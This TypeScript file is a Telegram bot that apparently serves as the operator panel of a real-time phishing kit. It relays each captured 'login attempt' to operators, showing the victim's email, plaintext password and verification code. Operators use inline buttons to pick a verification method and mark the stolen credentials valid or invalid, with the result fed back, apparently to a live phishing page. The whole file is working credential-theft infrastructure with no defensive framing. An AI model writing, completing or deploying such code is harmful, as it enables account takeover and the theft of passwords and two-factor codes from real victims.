import chalk from "chalk";
import { getUnixTime } from "date-fns";
import { eq } from "drizzle-orm";
import { session, Telegraf } from "telegraf";
import { env } from "@/env";
import { db, driver } from "@/lib/db/db";
import { tables } from "@/lib/db/schemas";
import {
  emitLoginAttempt,
  emitMethodAttempt,
  emitVerifyAttempt,
} from "./callback-bus";
import { CallbackDataType } from "./constants";
import { BunSqliteStore } from "./store";
import type { BotContext, SessionData } from "./types";
import { logAllSessions, sendMessageToAllSessions } from "./utils";

declare global {
  var bot: Telegraf<BotContext> | undefined;
}

const store = new BunSqliteStore<SessionData>(driver);
const _bot = globalThis.bot ?? new Telegraf<BotContext>(env.BOT_TOKEN);

_bot.telegram.setMyCommands([
  { command: "start", description: "Start the bot" },
  { command: "stop", description: "Stop the bot" },
  { command: "list", description: "List all users" },
  { command: "disable", description: "Disable a user" },
  { command: "enable", description: "Enable a user" },
]);

_bot.on("callback_query", async (ctx) => {
  //#region USER TOGGLE CALLBACK
  if (
    "data" in ctx.callbackQuery &&
    ctx.callbackQuery.data?.startsWith(`${CallbackDataType.UserToggle}:`)
  ) {
    const [, action, userId] = ctx.callbackQuery.data.split(":");

    if (!action || !userId) {
      return ctx.answerCbQuery("⚠️ Invalid user toggle data ⚠️");
    }

    if (action !== "enable" && action !== "disable") {
      return ctx.answerCbQuery("⚠️ Invalid user toggle action ⚠️");
    }

    const [user] = await db
      .select()
      .from(tables.user)
      .where(eq(tables.user.id, userId));

    if (!user) {
      return ctx.answerCbQuery("👤 User not found");
    }

    const shouldDisable = action === "disable";
    if (user.disabled === shouldDisable) {
      const alreadyText = shouldDisable
        ? "already disabled"
        : "already enabled";
      return ctx.answerCbQuery(`👤 User ${alreadyText}`);
    }

    await db
      .update(tables.user)
      .set({ disabled: shouldDisable })
      .where(eq(tables.user.id, user.id));

    const statusText = shouldDisable ? "❌ DISABLED" : "✅ ENABLED";

    const userMessage =
      "<b>👤 User</b>\n\n" +
      `<b>ID:</b> <code>${user.id}</code>\n` +
      `<b>Status:</b> ${statusText}`;

    const replyMarkup = {
      inline_keyboard: [
        [
          {
            text: "Disable",
            callback_data: `${CallbackDataType.UserToggle}:disable:${user.id}`,
          },
          {
            text: "Enable",
            callback_data: `${CallbackDataType.UserToggle}:enable:${user.id}`,
          },
        ],
      ],
    };

    await ctx.answerCbQuery(`👤 User ${statusText}`);

    try {
      await ctx.editMessageText(userMessage, {
        parse_mode: "HTML",
        reply_markup: replyMarkup,
      });
    } catch {
      await ctx.reply(userMessage, {
        parse_mode: "HTML",
        reply_markup: replyMarkup,
      });
    }
    return;
  }
  //#endregion

  //#region METHOD ATTEMPT CALLBACK
  if (
    "data" in ctx.callbackQuery &&
    ctx.callbackQuery.data?.startsWith(`${CallbackDataType.MethodAttempt}:`)
  ) {
    const [, loginAttemptId, method] = ctx.callbackQuery.data.split(":");

    if (!loginAttemptId) {
      return ctx.answerCbQuery("⚠️ Invalid method attempt ID ⚠️");
    }

    if (!method) {
      return ctx.answerCbQuery("⚠️ Invalid method ⚠️");
    }

    const [loginAttempt] = await db
      .select()
      .from(tables.loginAttempt)
      .where(eq(tables.loginAttempt.id, loginAttemptId));

    if (!loginAttempt) {
      return ctx.answerCbQuery("⚠️ Login attempt not found ⚠️");
    }

    emitMethodAttempt(loginAttemptId, { data: method });

    const messages = await db
      .select()
      .from(tables.message)
      .where(eq(tables.message.loginAttemptId, loginAttemptId));

    await Promise.allSettled(
      messages.map((message) =>
        ctx.telegram.editMessageText(
          message.chatId,
          message.messageId,
          undefined,
          `<b>⚠️ LOGIN ATTEMPT from user <code>${loginAttempt.userId}</code></b>`,
          { parse_mode: "HTML", reply_markup: { inline_keyboard: [] } },
        ),
      ),
    );

    return ctx.answerCbQuery("✅ Method attempt acknowledged");
  }
  //#endregion

  //#region LOGIN ATTEMPT CALLBACK
  if (
    "data" in ctx.callbackQuery &&
    ctx.callbackQuery.data?.startsWith(`${CallbackDataType.LoginAttempt}:`)
  ) {
    const [, loginAttemptId, loginAttemptStatus] =
      ctx.callbackQuery.data.split(":");

    if (!loginAttemptId) {
      return ctx.answerCbQuery("⚠️ Invalid login attempt ID ⚠️");
    }

    if (!loginAttemptStatus) {
      return ctx.answerCbQuery("⚠️ Invalid login attempt status ⚠️");
    }

    const [loginAttempt] = await db
      .select()
      .from(tables.loginAttempt)
      .where(eq(tables.loginAttempt.id, loginAttemptId));

    if (!loginAttempt) {
      return ctx.answerCbQuery("⚠️ Login attempt not found ⚠️");
    }

    emitLoginAttempt(loginAttempt.id, { data: loginAttemptStatus });

    const messages = await db
      .select()
      .from(tables.message)
      .where(eq(tables.message.loginAttemptId, loginAttempt.id));

    await Promise.allSettled(
      messages.map((message) =>
        ctx.telegram.editMessageReplyMarkup(
          message.chatId,
          message.messageId,
          undefined,
          { inline_keyboard: [] },
        ),
      ),
    );

    return ctx.answerCbQuery("✅ Login attempt acknowledged");
  }
  //#endregion

  //#region VERIFY ATTEMPT CALLBACK
  if (
    "data" in ctx.callbackQuery &&
    ctx.callbackQuery.data?.startsWith(`${CallbackDataType.VerifyAttempt}:`)
  ) {
    const [, loginAttemptId, verifyAttemptStatus] =
      ctx.callbackQuery.data.split(":");

    if (!loginAttemptId) {
      return ctx.answerCbQuery("⚠️ Invalid verify attempt ID ⚠️");
    }

    if (!verifyAttemptStatus) {
      return ctx.answerCbQuery("⚠️ Invalid verify attempt status ⚠️");
    }

    const [loginAttempt] = await db
      .select()
      .from(tables.loginAttempt)
      .where(eq(tables.loginAttempt.id, loginAttemptId));

    if (!loginAttempt) {
      return ctx.answerCbQuery("⚠️ Verify attempt not found ⚠️");
    }

    emitVerifyAttempt(loginAttempt.id, { data: verifyAttemptStatus });

    const formattedVerifyAttemptStatus = {
      valid: "✅ VALID",
      invalid: "❌ INVALID",
    }[verifyAttemptStatus];

    const messages = await db
      .select()
      .from(tables.message)
      .where(eq(tables.message.loginAttemptId, loginAttempt.id));

    await Promise.allSettled(
      messages.map((message) =>
        ctx.telegram.editMessageText(
          message.chatId,
          message.messageId,
          undefined,
          `<b>⚠️ LOGIN ATTEMPT from user <code>${loginAttempt.userId}</code></b>\n\n` +
            `<b>🔑 EMAIL:</b> <code>${loginAttempt.email}</code>\n` +
            `<b>🔑 PASSWORD:</b> <code>${loginAttempt.password}</code>\n` +
            `<b>🔐 CODE:</b> <code>${loginAttempt.code}</code> \n` +
            `<b>❗ STATUS:</b> ${formattedVerifyAttemptStatus}`,
          { parse_mode: "HTML", reply_markup: { inline_keyboard: [] } },
        ),
      ),
    );

    return ctx.answerCbQuery("✅ Verify attempt acknowledged");
  }
  //#endregion

  return ctx.answerCbQuery("⚠️ Invalid callback data ⚠️");
});

//#region COMMANDS
_bot.command("list", async (ctx) => {
  const users = await db.select().from(tables.user);

  if (users.length === 0) {
    return ctx.reply("👤 No users found");
  }

  for (const [index, userRecord] of users.entries()) {
    const ordinal = index + 1;
    const status = userRecord.disabled ? "❌ DISABLED" : "✅ ENABLED";
    await ctx.reply(
      `<b>👤 User #${ordinal}</b>\n\n` +
        `<b>ID:</b> <code>${userRecord.id}</code>\n` +
        `<b>Status:</b> ${status}`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "Disable",
                callback_data: `${CallbackDataType.UserToggle}:disable:${userRecord.id}`,
              },
              {
                text: "Enable",
                callback_data: `${CallbackDataType.UserToggle}:enable:${userRecord.id}`,
              },
            ],
          ],
        },
      },
    );
  }
});

_bot.command("disable", async (ctx) => {
  const [userIdArg] = ctx.args ?? [];

  if (!userIdArg?.trim()) {
    return ctx.reply("⚠️ Usage: /disable <userId>");
  }

  const [user] = await db
    .select()
    .from(tables.user)
    .where(eq(tables.user.id, userIdArg.trim()));

  if (!user) {
    return ctx.reply("👤 User not found");
  }

  await db
    .update(tables.user)
    .set({ disabled: true })
    .where(eq(tables.user.id, user.id));

  return ctx.reply("👤 User disabled");
});

_bot.command("enable", async (ctx) => {
  const [userIdArg] = ctx.args ?? [];

  if (!userIdArg?.trim()) {
    return ctx.reply("⚠️ Usage: /enable <userId>");
  }

  const [user] = await db
    .select()
    .from(tables.user)
    .where(eq(tables.user.id, userIdArg.trim()));

  if (!user) {
    return ctx.reply("👤 User not found");
  }

  await db
    .update(tables.user)
    .set({ disabled: false })
    .where(eq(tables.user.id, user.id));

  return ctx.reply("👤 User enabled");
});

_bot.command("start", (ctx) => {
  ctx.session ??= {};
  ctx.session.joinedAt = getUnixTime(new Date());
  ctx.reply("🚀 You will receive messages");
});

_bot.command("stop", (ctx) => {
  const sessionKey = `${ctx.chat.id}:${ctx.from?.id ?? ctx.chat.id}`;
  store.delete(sessionKey);
  return ctx.reply("🛑 You will not receive messages");
});
//#endregion

//#region MIDDLEWARES
_bot.use(
  session({
    store,
    defaultSession: () => ({ createdAt: getUnixTime(new Date()) }),
  }),
);

_bot.use((ctx, next) => {
  ctx.session ??= {};
  ctx.session.lastSeenAt = getUnixTime(new Date());
  return next();
});
//#endregion

//#region LAUNCHING
if (!globalThis.bot) {
  _bot.launch(async () => {
    logAllSessions();
    sendMessageToAllSessions("🤖 Bot has been started");
    console.log(chalk.green("🤖 Bot started"));
  });

  process.once("SIGINT", async () => {
    sendMessageToAllSessions("🤖 Bot has been stopped");
    _bot.stop("SIGINT");
  });

  process.once("SIGTERM", async () => {
    sendMessageToAllSessions("🤖 Bot has been stopped");
    _bot.stop("SIGTERM");
  });

  globalThis.bot = _bot;
}
//#endregion
